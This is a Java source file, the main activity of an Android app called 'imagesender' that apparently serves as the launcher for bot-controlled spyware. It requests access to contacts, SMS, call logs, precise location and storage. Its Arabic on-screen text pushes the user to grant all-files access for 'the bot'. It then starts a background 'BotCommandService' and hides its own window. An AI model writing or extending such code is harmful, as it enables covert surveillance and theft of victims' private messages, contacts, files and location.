package com.dotbhai.imagesender;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        
        if (Build.VERSION.SDK_INT >= 23) {
            requestPermissions(new String[]{
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.READ_MEDIA_IMAGES,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.ACCESS_FINE_LOCATION
            }, 100);
        }

        boolean needStorage = false;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                needStorage = true;
            }
        }

        if (needStorage) {
            LinearLayout layout = new LinearLayout(this);
            layout.setOrientation(LinearLayout.VERTICAL);
            layout.setPadding(60, 100, 60, 60);
            
            TextView tv = new TextView(this);
            tv.setText("⚠️ خطوة إجبارية:\n\nلازم تضغط الزر بالأسفل وتفعل خيار (السماح بإدارة جميع الملفات) عشان يشتغل زر الملفات والصور في البوت.");
            tv.setTextSize(18);
            layout.addView(tv);
            
            Button btn = new Button(this);
            btn.setText("اضغط هنا للسماح بالملفات");
            btn.setOnClickListener(v -> {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.addCategory("android.intent.category.DEFAULT");
                    intent.setData(Uri.parse(String.format("package:%s", getPackageName())));
                    startActivity(intent);
                } catch (Exception e) {
                    Intent intent = new Intent();
                    intent.setAction(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    startActivity(intent);
                }
            });
            layout.addView(btn);
            setContentView(layout);
            
        } else {
            startBot();
        }
    }

    private void startBot() {
        try {
            Intent serviceIntent = new Intent(this, BotCommandService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {}
        finish();
        moveTaskToBack(true);
    }
}